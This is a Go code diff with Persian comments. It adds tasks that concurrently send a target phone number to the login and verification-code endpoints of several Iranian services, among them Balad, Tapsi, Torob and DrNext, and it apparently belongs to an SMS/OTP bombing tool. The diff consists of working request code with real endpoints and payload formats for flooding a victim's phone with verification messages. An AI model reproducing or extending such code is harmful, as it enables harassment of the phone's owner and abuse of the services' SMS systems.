@@ -353,7 +353,54 @@ cookieJar, _ := cookiejar.New(nil)
 
 
 
+		// balad.ir - POST JSON
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"phone_number": phone, // فرمت 09...
+					"os_type":      "W",
+				}
+				sendJSONRequest(c, ctx, "https://account.api.balad.ir/api/web/auth/login/", payload, &wg, ch)
+			}
+		}(client)
 
+	// تپسی (Tapsi) - POST JSON
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"credential": map[string]interface{}{
+						"phoneNumber": phone, // فرمت 09...
+						"role":        "PASSENGER",
+					},
+				}
+				sendJSONRequest(c, ctx, "https://tap33.me/api/v2/user", payload, &wg, ch)
+			}
+		}(client)
+
+		// تورب (Torob) - GET
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				// ساخت URL با اضافه کردن شماره تلفن به پارامتر query
+				torobURL := fmt.Sprintf("https://api.torob.com/a/phone/send-pin/?phone_number=%s", getPhoneNumberNoZero(phone)) // فرمت 9...
+				sendGETRequest(c, ctx, torobURL, &wg, ch)
+			}
+		}(client)
+
+
+		// دکتر نکست (DrNext) - POST JSON
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"source": "besina",
+					"mobile": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", payload, &wg, ch)
+			}
+		}(client)
 		// skmei-iran.com register (Registration/OTP - POST Form)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
